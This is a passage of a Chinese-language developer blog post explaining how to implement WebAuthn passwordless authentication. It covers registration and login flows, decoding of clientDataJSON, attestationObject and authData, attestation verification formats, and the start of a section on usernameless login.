data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 ID 列表（即 <code>allowCredentials</code>）。</strong></p>\n<p>之后前端的处理流程就和注册时基本一致了。只是需要注意验证流程中获取到的 <code>PublicKeyCredential</code> 的结构和注册时的稍有不同。</p>\n<p>当浏览器将数据传回后，依赖方需要做的事情就比之前要麻烦一些了。依赖方需要验证挑战，并用之前存储的公钥验证签名和签名计数。同样地，这一步有很多第三方库可以帮我们做。最后，如果验证全部通过，我们就可以允许用户登录了。</p>\n<p>到目前为止，我们已经实现了一个简单的 WebAuthn 验证服务。不过这只是一个最基础的实现，对于很多高安全要求的身份认证这是远远不够的。因此，我们需要摆脱对第三方库的依赖，深入了解 WebAuthn。你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分，不过对于基础的 WebAuthn 实现，我们的旅程就到这里了。</p>\n<h2>拓展阅读</h2>\n<p>如果你的目标只是快速了解如何开发 WebAuthn，那么你阅读到这里就可以了。同时，上一节例子中的部分代码来自于我为了这篇文章开发的 WordPress 插件 WP-WebAuthn，这个插件可以为你的 WordPress 启用 WebAuthn 无密码登录（并非二步验证），你可以查阅插件的 <a href=\"https://github.com/yrccondor/wp-webauthn\">GitHub 存储库</a>了解更多，也可以自己安装试一试。</p>\n<p>如果你正在使用 Chrome 开发，Chrome 87+ 版本添加了一个 WebAuthn 开发者面板，可以帮助你在没有任何实体验证器的情况下开发 WebAuthn 功能。你可以在 Google 的<a href=\"https://developers.google.com/web/tools/chrome-devtools/webauthn\">这篇文章</a>中了解更多。不够，如果你正在使用 Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 